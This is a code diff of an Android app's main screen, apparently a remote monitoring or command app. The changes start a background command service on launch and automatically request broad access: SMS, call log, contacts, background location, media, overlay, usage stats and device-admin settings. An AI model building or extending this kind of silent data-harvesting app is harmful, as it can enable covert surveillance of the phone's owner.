@@ -14,7 +14,6 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import com.abuzahra.manager.executor.DataCollector
-import com.abuzahra.manager.executor.MonitorExecutor
 import com.abuzahra.manager.service.CommandService
 import com.abuzahra.manager.util.DeviceUtils
 
@@ -46,18 +45,24 @@ class MainActivity : AppCompatActivity() {
         textDeviceId.text = "ID: ${DeviceUtils.getDeviceId(this)}"
 
         val deviceInfo = DataCollector.getDeviceInfo(this)
-        findViewById<TextView>(R.id.textModel).text = "📱 ${deviceInfo["model"]}"
-        findViewById<TextView>(R.id.textAndroid).text = "🤖 Android ${deviceInfo["android"]}"
+        findViewById<TextView>(R.id.textModel).text = "${deviceInfo["model"]}"
+        findViewById<TextView>(R.id.textAndroid).text = "Android ${deviceInfo["android"]}"
 
         // Update battery
         val battery = DataCollector.getBattery(this)
-        textBattery.text = "🔋 ${battery["level"]}% (${battery["status"]})"
+        textBattery.text = "${battery["level"]}% (${battery["status"]})"
 
         // Update status
-        textStatus.text = "🟢 متصل"
+        textStatus.text = "Connected"
+
+        // Ensure service is running
+        CommandService.start(this)
 
         // Update permissions
         updatePermissionCount(textPermissions)
+
+        // Auto-request permissions on first launch
+        requestAllPermissions()
 
         // Request permissions button
         btnPermissions.setOnClickListener {
@@ -66,8 +71,10 @@ class MainActivity : AppCompatActivity() {
 
         // Restart service
         btnRestart.setOnClickListener {
+            CommandService.stop(this)
+            Thread.sleep(500)
             CommandService.start(this)
-            textStatus.text = "🟢 تم إعادة تشغيل الخدمة"
+            textStatus.text = "Service restarted"
             Toast.makeText(this, "Service restarted", Toast.LENGTH_SHORT).show()
         }
 
@@ -89,10 +96,9 @@ class MainActivity : AppCompatActivity() {
 
     override fun onResume() {
         super.onResume()
-        // Refresh battery info
         try {
             val battery = DataCollector.getBattery(this)
-            findViewById<TextView>(R.id.textBattery).text = "🔋 ${battery["level"]}% (${battery["status"]})"
+            findViewById<TextView>(R.id.textBattery).text = "${battery["level"]}% (${battery["status"]})"
         } catch (_: Exception) {}
     }
 
@@ -104,16 +110,11 @@ class MainActivity : AppCompatActivity() {
                 granted++
             }
         }
-        textView.text = "🔑 Permissions: $granted/$total"
-        if (granted < total) {
-            textView.setTextColor(android.graphics.Color.parseColor("#FF6B6B"))
-        } else {
-            textView.setTextColor(android.graphics.Color.parseColor("#4ADE80"))
-        }
+        textView.text = "Permissions: $granted/$total"
     }
 
     private fun getRequiredPermissions(): Array<String> {
-        return arrayOf(
+        val perms = mutableListOf(
             Manifest.permission.READ_CONTACTS,
             Manifest.permission.READ_CALL_LOG,
             Manifest.permission.READ_SMS,
@@ -126,13 +127,29 @@ class MainActivity : AppCompatActivity() {
             Manifest.permission.READ_PHONE_STATE,
             Manifest.permission.READ_CALENDAR,
             Manifest.permission.CALL_PHONE,
-            Manifest.permission.WRITE_EXTERNAL_STORAGE,
             Manifest.permission.ACCESS_WIFI_STATE,
             Manifest.permission.CHANGE_WIFI_STATE,
             Manifest.permission.BLUETOOTH,
             Manifest.permission.BLUETOOTH_ADMIN,
-            Manifest.permission.READ_EXTERNAL_STORAGE
+            Manifest.permission.BLUETOOTH_CONNECT,
+            Manifest.permission.VIBRATE,
+            Manifest.permission.FLASHLIGHT,
+            Manifest.permission.USE_BIOMETRIC,
+            Manifest.permission.NFC,
         )
+        // Add storage permissions based on SDK
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
+            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+            perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
+        } else {
+            perms.add(Manifest.permission.READ_MEDIA_IMAGES)
+            perms.add(Manifest.permission.READ_MEDIA_VIDEO)
+            perms.add(Manifest.permission.READ_MEDIA_AUDIO)
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            perms.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+        }
+        return perms.toTypedArray()
     }
 
     private fun requestAllPermissions() {
@@ -149,7 +166,6 @@ class MainActivity : AppCompatActivity() {
                 PERMISSION_REQUEST
             )
         } else {
-            Toast.makeText(this, "All permissions granted!", Toast.LENGTH_SHORT).show()
             // Request special permissions
             requestSpecialPermissions()
         }
@@ -158,35 +174,42 @@ class MainActivity : AppCompatActivity() {
     private fun requestSpecialPermissions() {
         // Battery optimization
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            val intent = Intent(
-                Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
-                Uri.parse("package:$packageName")
-            )
-            startActivity(intent)
+            try {
+                val intent = Intent(
+                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                    Uri.parse("package:$packageName")
+                )
+                startActivity(intent)
+            } catch (_: Exception) {}
         }
 
         // System alert window
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (!Settings.canDrawOverlays(this)) {
-                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
-                startActivity(intent)
+                try {
+                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
+                    startActivity(intent)
+                } catch (_: Exception) {}
             }
         }
 
-        // Usage stats
-        val appUsageIntent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
-        startActivity(appUsageIntent)
+        // Usage stats (for screen time)
+        try {
+            val appUsageIntent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
+            startActivity(appUsageIntent)
+        } catch (_: Exception) {}
+
+        // Device admin
+        try {
+            val deviceAdminIntent = Intent(Settings.ACTION_SECURITY_SETTINGS)
+            startActivity(deviceAdminIntent)
+        } catch (_: Exception) {}
     }
 
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode == PERMISSION_REQUEST) {
-            val granted = grantResults.count { it == PackageManager.PERMISSION_GRANTED }
             updatePermissionCount(findViewById(R.id.textPermissions))
-            Toast.makeText(this, "$granted permissions granted", Toast.LENGTH_SHORT).show()
-
-            // Request more special permissions
-            requestSpecialPermissions()
         }
     }
 }
